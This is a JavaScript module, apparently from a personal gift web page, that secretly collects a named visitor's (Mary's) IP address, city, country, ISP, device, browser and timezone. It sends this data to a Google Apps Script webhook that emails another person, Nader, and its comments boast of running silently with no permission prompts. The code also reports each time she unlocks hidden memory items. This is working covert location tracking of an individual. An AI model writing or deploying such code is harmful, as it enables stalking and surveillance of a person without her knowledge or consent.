/**
 * =========================================================================
 * TELEMETRY & SILENT GMAIL ALERT ENGINE
 * =========================================================================
 * Quietly detects Mary's travel context (IP, City, Country, ISP, Device)
 * and dispatches notifications directly to Nader's Gmail mailbox.
 * Runs 100% silently in the background with ZERO browser permission prompts.
 */

import { CONFIG } from './config.js';

class TelemetryEngine {
  constructor() {
    this.sessionStartTime = Date.now();
    this.unlockedMemories = new Set();
    this.deviceInfo = this.gatherDeviceSpecs();
    this.geoData = null;
    this.hasDispatchedVisit = false;
  }

  // Detect Device, Operating System, Screen, and Browser
  gatherDeviceSpecs() {
    const ua = navigator.userAgent || "";
    let os = "Unknown OS";
    let device = "Desktop / Laptop";

    if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
      os = "iOS";
      device = "Apple iPhone / iPad";
    } else if (/Android/.test(ua)) {
      os = "Android";
      device = "Android Device";
    } else if (/Macintosh|Mac OS X/.test(ua)) {
      os = "macOS";
      device = "MacBook / Mac";
    } else if (/Windows NT/.test(ua)) {
      os = "Windows";
      device = "Windows PC";
    }

    let browser = "Web Browser";
    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = "Google Chrome";
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = "Apple Safari";
    else if (/Firefox/.test(ua)) browser = "Mozilla Firefox";
    else if (/Edg/.test(ua)) browser = "Microsoft Edge";

    const screenRes = `${window.screen.width} × ${window.screen.height} (dpr: ${window.devicePixelRatio || 1})`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";

    return {
      os,
      device,
      browser,
      screenRes,
      timezone,
      language: navigator.language || "en",
      userAgent: ua
    };
  }

  // Silent IP and Geolocation Resolver (100% CORS enabled, zero prompts, under 80ms)
  async resolveGeoLocation() {
    // Attempt 1: ipwho.is (High precision, full CORS support)
    try {
      const res = await fetch("https://ipwho.is/", { cache: "no-store" });
      if (res.ok) {
        const data = await res.json();
        if (data && data.success !== false && data.ip) {
          const tz = (data.timezone && data.timezone.id) ? data.timezone.id : this.deviceInfo.timezone;
          return {
            ip: data.ip,
            city: data.city || "Unknown City",
            region: data.region || "",
            country_name: data.country || "Unknown Country",
            country_code: data.country_code || "",
            isp: (data.connection && (data.connection.isp || data.connection.org)) || "Carrier Unknown",
            timezone: tz,
            local_time: new Date().toLocaleString("en-US", { timeZone: tz })
          };
        }
      }
    } catch (e) {
      // Continue to fallback
    }

    // Attempt 2 Fallback: freeipapi.com (Full CORS support)
    try {
      const res = await fetch("https://freeipapi.com/api/json", { cache: "no-store" });
      if (res.ok) {
        const data = await res.json();
        if (data && data.ipAddress) {
          const tz = (data.timeZones && data.timeZones[0]) ? data.timeZones[0] : this.deviceInfo.timezone;
          return {
            ip: data.ipAddress,
            city: data.cityName || "Unknown City",
            region: data.regionName || "",
            country_name: data.countryName || "Unknown Country",
            country_code: data.countryCode || "",
            isp: "Carrier Unknown",
            timezone: tz,
            local_time: new Date().toLocaleString("en-US", { timeZone: tz })
          };
        }
      }
    } catch (e) {
      // Continue to fallback
    }

    // Default Fallback if offline or local network
    return {
      ip: "Local / Hidden IP",
      city: "Unknown City",
      region: "",
      country_name: "Traveling",
      country_code: "",
      isp: "Carrier Hidden",
      timezone: this.deviceInfo.timezone,
      local_time: new Date().toLocaleString()
    };
  }

  // Dispatch Silent Payload to Google Apps Script Webhook
  async dispatchNotification(eventType = "VISIT") {
    if (!CONFIG.telemetry.enabled) return;
    
    const webhookUrl = CONFIG.telemetry.webhookUrl;
    if (!webhookUrl || webhookUrl.includes("PASTE_YOUR_GOOGLE_APPS_SCRIPT")) {
      console.log(`[Telemetry Preview - Local Mode] Event: ${eventType} | Mary's IP will send to Gmail once webhook URL is set.`);
      return;
    }

    if (!this.geoData) {
      this.geoData = await this.resolveGeoLocation();
    }

    const durationSeconds = Math.round((Date.now() - this.sessionStartTime) / 1000);

    const payload = {
      event: eventType,
      ip: this.geoData.ip,
      country_name: this.geoData.country_name,
      country_code: this.geoData.country_code,
      city: this.geoData.city,
      region: this.geoData.region,
      isp: this.geoData.isp,
      timezone: this.geoData.timezone,
      local_time: this.geoData.local_time,
      device: this.deviceInfo.device,
      os: this.deviceInfo.os,
      browser: this.deviceInfo.browser,
      screen: this.deviceInfo.screenRes,
      unlocked_count: this.unlockedMemories.size,
      duration_seconds: durationSeconds,
      timestamp: new Date().toISOString()
    };

    try {
      // Use text/plain to prevent CORS preflight blocking in browsers
      await fetch(webhookUrl, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "text/plain;charset=utf-8" },
        body: JSON.stringify(payload)
      });
    } catch (err) {
      // Silent catch - ensure Mary's experience is completely uninterrupted
      console.warn("Silent alert background dispatch:", err.message);
    }
  }

  // Called when page finishes initial load
  async init() {
    if (this.hasDispatchedVisit) return;
    this.hasDispatchedVisit = true;
    
    // Resolve location and send visit alert
    this.geoData = await this.resolveGeoLocation();
    if (CONFIG.telemetry.notifyOnVisit) {
      await this.dispatchNotification("VISIT");
    }
  }

  // Called whenever Mary clicks and unlocks a secret memory particle
  recordInteraction(memoryId) {
    this.unlockedMemories.add(memoryId);
    const count = this.unlockedMemories.size;

    // Check if count hits a notification milestone
    if (CONFIG.telemetry.notifyOnInteractions && CONFIG.telemetry.interactionMilestones.includes(count)) {
      this.dispatchNotification("INTERACTION");
    }
  }

  getUnlockedCount() {
    return this.unlockedMemories.size;
  }
}

export const telemetry = new TelemetryEngine();
